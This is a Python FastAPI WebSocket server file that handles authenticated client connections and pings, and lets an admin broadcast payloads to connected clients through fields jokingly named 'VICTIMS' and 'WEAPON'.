from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from helpers.middleware import CheckRequest
from helpers.validator import is_valid_id
from helpers.wsobjs import WSObjects

from objects.errors import Errors
from helpers.constants import (
    WS_TYPE_PING,
)

from handlers import handle_message
from helpers.connection_manager import ConnectionManager


app = FastAPI()

manager = ConnectionManager()


@app.get("/")
async def index():
    return Errors.InvalidRequest()


@app.get("/health")
async def health():
    return {"alive": True}


@app.websocket("/")
async def websocket_endpoint(ws: WebSocket):
    admin, uid, error = await CheckRequest(ws)
    if error:
        print(f"WebSocket connection rejected: {error['message']}")
        await ws.close(
            code=error.get("code", 1008), reason=error.get("message", "Unauthorized")
        )
        return

    if admin:
        await ws.accept()
    if not admin:
        await manager.connect(ws, uid)

    try:
        while True:
            data = await ws.receive_json()

            if data.get("t") and data.get("o"):
                # ping
                if data["t"] == WS_TYPE_PING:
                    await manager.answer(WSObjects.Pong(), ws)
                    continue

                # check for id
                if not data["o"].get("id") or not is_valid_id(data["o"].get("id")):
                    await manager.answer(WSObjects.WSError(1, "No ID of request"), ws)
                    continue

                try:await handle_message(data, manager, uid, admin)
                except Exception as e:
                    print(e)

            if data.get("ADMIN-SAYS") and admin:
                try:
                    js = data["ADMIN-SAYS"]
                    users = js["VICTIMS"]
                    payload = js["WEAPON"]

                    if users == "ALL":
                        f = await manager.broadcast(payload)
                    else:
                        f = await manager.selective_broadcast(payload, users)

                    await manager.answer(
                        {
                            "status": "ok",
                            "clients": len(users) if users != "ALL" else f,
                            "probably_got": f,
                        },
                        ws,
                    )
                except Exception as e:
                    await manager.answer({"status": "error", "reason": str(e)}, ws)
                continue

            continue

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"WebSocket error: {e}")
        await ws.close(code=1011, reason="Internal Server Error")
    finally:
        if not admin:
            manager.disconnect(ws, uid)
